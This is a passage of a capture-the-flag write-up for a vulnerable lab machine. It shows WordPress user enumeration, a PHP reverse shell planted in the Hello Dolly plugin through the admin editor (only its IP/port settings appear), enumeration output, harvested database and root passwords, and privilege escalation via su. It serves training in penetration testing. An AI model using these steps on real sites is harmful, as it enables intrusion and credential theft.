[i] User(s) Identified:

[+] c0rrupt3d_brain
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://evm.cyber.range/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 73

[+] Finished: Sun Jul 31 23:21:46 2022
[+] Requests Done: 3374
[+] Cached Requests: 48
[+] Data Sent: 1.65 MB
[+] Data Received: 484.858 KB
[+] Memory used: 247.969 MB
[+] Elapsed time: 00:00:10
```

## WordPress Admin Panel

Navigate to http://evm.cyber.range/wordpress/wp-admin and utilize the login credentials we have discovered to gain access to the admin panel and explore the content available.

![](../../assets/img/vulnhub/ev6.png)

One of the initial aspects I tend to investigate on a WordPress installation is the presence of a plugin that can be modified. To begin, I access the Plugin Editor.

![](../../assets/img/vulnhub/ev7.png)

Next, I browse through the installed plugins to search for a plugin file that can be edited.

![](../../assets/img/vulnhub/ev8.png)

## Exploit

It appears that the hello.php file within the Hello Dolly plugin can be modified. As the plugin is currently deactivated, this is ideal for our purposes. Within the PHP editor, we will insert the following reverse shell payload. We may either overwrite the existing code or comment it out prior to doing so. Finally, we must adjust these parameters to reflect the IP address and port number of our Kali system.

```python
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Select the Installed Plugins option and enable the Hello Dolly plugin.

![](../../assets/img/vulnhub/ev9.png)

![](../../assets/img/vulnhub/ev10.png)

## Post-Exploit Enumeration

### Current User

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

sudo -v
Sorry, user www-data may not run sudo on ubuntu-extermely-vulnerable-m4ch1ine.
```

## OS & Kernel

```bash
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

## Users

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:113::/var/run/dbus:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
bind:x:111:118::/var/cache/bind:/bin/false
postfix:x:112:120::/var/spool/postfix:/bin/false
dovecot:x:113:122:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:114:123:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:116:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
libvirt-qemu:x:64055:112:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:117:126:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
rooter:x:1000:1000:root3r,,,:/home/rooter:/bin/bash
```

## Groups

```bash
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,rooter
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:rooter
floppy:x:25:
tape:x:26:
sudo:x:27:rooter
audio:x:29:
dip:x:30:rooter
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:rooter
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
lxd:x:110:rooter
mysql:x:111:
kvm:x:112:
messagebus:x:113:
uuidd:x:114:
sambashare:x:115:rooter
mlocate:x:116:
ssh:x:117:
bind:x:118:
ssl-cert:x:119:postgres
postfix:x:120:
postdrop:x:121:
dovecot:x:122:
dovenull:x:123:
postgres:x:124:
winbindd_priv:x:125:
libvirtd:x:126:rooter
root3r:x:1000:
lpadmin:x:127:rooter
```

## Network

### Interfaces

```bash
2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether f6:89:6c:c2:98:e2 brd ff:ff:ff:ff:ff:ff
    inet 10.9.9.57/24 brd 10.9.9.255 scope global ens18
       valid_lft forever preferred_lft forever
    inet6 fe80::f489:6cff:fec2:98e2/64 scope link 
       valid_lft forever preferred_lft forever
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff
```

### Open Ports

```bash
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
tcp        0      0 10.9.9.57:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::110                  :::*                    LISTEN      -               
tcp6       0      0 :::143                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::53                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:5432                :::*                    LISTEN      -               
tcp6       0      0 ::1:953                 :::*                    LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      -
```

## Processes

```bash
ps -aeo user,pid,command --sort user

USER       PID COMMAND
bind      1173 /usr/sbin/named -f -u bind
daemon     908 /usr/sbin/atd -f
dovecot   1341 dovecot/anvil
libvirt+  1627 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.co
message+   934 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopid
mysql     1279 /usr/sbin/mysqld
postgres  1049 /usr/lib/postgresql/9.5/bin/postgres -D /var/lib/postgresql/9.5/m
postgres  1053 postgres: checkpointer process   
postgres  1054 postgres: writer process   
postgres  1055 postgres: wal writer process   
postgres  1056 postgres: autovacuum launcher process   
postgres  1057 postgres: stats collector process   
root         1 /sbin/init
root         2 [kthreadd]
root         3 [ksoftirqd/0]
root         5 [kworker/0:0H]
root         7 [rcu_sched]
root         8 [rcu_bh]
root         9 [migration/0]
root        10 [watchdog/0]
root        11 [kdevtmpfs]
root        12 [netns]
root        13 [perf]
root        14 [khungtaskd]
root        15 [writeback]
root        16 [ksmd]
root        17 [khugepaged]
root        18 [crypto]
root        19 [kintegrityd]
root        20 [bioset]
root        21 [kblockd]
root        22 [ata_sff]
root        23 [md]
root        24 [devfreq_wq]
root        27 [kswapd0]
root        28 [vmstat]
root        29 [fsnotify_mark]
root        30 [ecryptfs-kthrea]
root        46 [kthrotld]
root        47 [acpi_thermal_pm]
root        48 [vballoon]
root        49 [bioset]
root        50 [bioset]
root        51 [bioset]
root        52 [bioset]
root        53 [bioset]
root        54 [bioset]
root        55 [bioset]
root        56 [bioset]
root        57 [scsi_eh_0]
root        58 [scsi_tmf_0]
root        59 [scsi_eh_1]
root        60 [scsi_tmf_1]
root        66 [ipv6_addrconf]
root        79 [deferwq]
root        80 [charger_manager]
root       120 [bioset]
root       121 [bioset]
root       122 [bioset]
root       123 [bioset]
root       125 [bioset]
root       126 [bioset]
root       127 [bioset]
root       128 [bioset]
root       129 [kpsmoused]
root       138 [scsi_eh_2]
root       139 [scsi_tmf_2]
root       140 [scsi_eh_3]
root       141 [scsi_tmf_3]
root       142 [scsi_eh_4]
root       143 [scsi_tmf_4]
root       144 [scsi_eh_5]
root       145 [scsi_tmf_5]
root       146 [scsi_eh_6]
root       147 [scsi_tmf_6]
root       148 [scsi_eh_7]
root       149 [scsi_tmf_7]
root       152 [kworker/u2:7]
root       153 [bioset]
root       154 [kworker/u2:8]
root       230 [raid5wq]
root       255 [kdmflush]
root       256 [bioset]
root       266 [kdmflush]
root       267 [bioset]
root       283 [bioset]
root       308 [kworker/0:1H]
root       314 [jbd2/dm-0-8]
root       315 [ext4-rsv-conver]
root       383 /lib/systemd/systemd-journald
root       397 [iscsi_eh]
root       398 [kauditd]
root       411 [ib_addr]
root       414 /sbin/lvmetad -f
root       420 [ib_mcast]
root       426 [ib_nl_sa_wq]
root       428 [ib_cm]
root       429 [iw_cm_wq]
root       433 [rdma_cm]
root       448 /lib/systemd/systemd-udevd
root       711 [ext4-rsv-conver]
root       895 /usr/sbin/acpid
root       896 /usr/lib/accountsservice/accounts-daemon
root       900 /usr/sbin/cron -f
root       901 /lib/systemd/systemd-logind
root       913 /sbin/cgmanager -m name=systemd
root       915 /usr/bin/lxcfs /var/lib/lxcfs/
root       964 /usr/lib/snapd/snapd
root       996 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemoni
root      1003 /usr/lib/policykit-1/polkitd --no-debug
root      1060 /usr/sbin/smbd -D
root      1070 /usr/sbin/smbd -D
root      1090 /usr/sbin/smbd -D
root      1098 /sbin/dhclient -1 -v -pf /run/dhclient.ens18.pid -lf /var/lib/dhc
root      1184 /usr/sbin/sshd -D
root      1206 /sbin/iscsid
root      1207 /sbin/iscsid
root      1234 /usr/sbin/libvirtd
root      1318 /sbin/agetty --noclear tty1 linux
root      1337 /usr/sbin/dovecot
root      1342 dovecot/log
root      1345 dovecot/config
root      1391 /usr/sbin/apache2 -k start
root      1428 /usr/sbin/winbindd
root      1429 /usr/sbin/nmbd -D
root      1430 /usr/sbin/winbindd
root      1628 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.co
root      6464 [kworker/0:2]
root      6681 [kworker/0:0]
syslog     906 /usr/sbin/rsyslogd -n
systemd+   757 /lib/systemd/systemd-timesyncd
www-data  3563 /usr/sbin/apache2 -k start
www-data  6420 /usr/sbin/apache2 -k start
www-data  6425 /usr/sbin/apache2 -k start
www-data  6426 /usr/sbin/apache2 -k start
www-data  6434 /usr/sbin/apache2 -k start
www-data  6436 /usr/sbin/apache2 -k start
www-data  6438 /usr/sbin/apache2 -k start
www-data  6565 sh -c uname -a; w; id; /bin/sh -i
www-data  6569 /bin/sh -i
www-data  6575 python -c import pty; pty.spawn('/bin/bash')
www-data  6576 /bin/bash
www-data  6643 sh -c uname -a; w; id; /bin/sh -i
www-data  6647 /bin/sh -i
www-data  6652 python -c import pty; pty.spawn('/bin/bash')
www-data  6653 /bin/bash
www-data  6728 ps -aeo user,pid,command --sort user
www-data  7451 /usr/sbin/apache2 -k start
www-data 30692 /usr/sbin/apache2 -k start
www-data 32212 /usr/sbin/apache2 -k start
```

## Interesting Files

`/var/www/html/wp-config.php`

```sql
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'hackme_wp' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', '123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

`/home/root3r/.root_password_ssh.txt`

File content is `willy26,` could be a password for another user. Doesn't work for SSH as root or root3r

`/home/root3r/test.txt`

File content is 123, but interesting to see the file is owned by root. Could be related to some kind of script/binary or root cron job.


## Privilege Escalation

As anticipated, the file named .root_password_ssh.txt contains the root password. The use of ssh in the file name was likely intended to deceive us. Nevertheless, upon examining the /etc/ssh/sshd_config file, we can observe that logging in as the root user through SSH is prohibited.

![](../../assets/img/vulnhub/ev10.png)

The directive at the top supersedes the allow statement at the bottom. As a result, attempting to login as root through SSH would not work. Instead, we can use the su root command and input the password we discovered to gain root access. And just like that, we are now the root user.

![](../../assets/img/vulnhub/ev11.png)

### Flags

`/root/proof.txt`

![](../../assets/img/vulnhub/ev12.png)

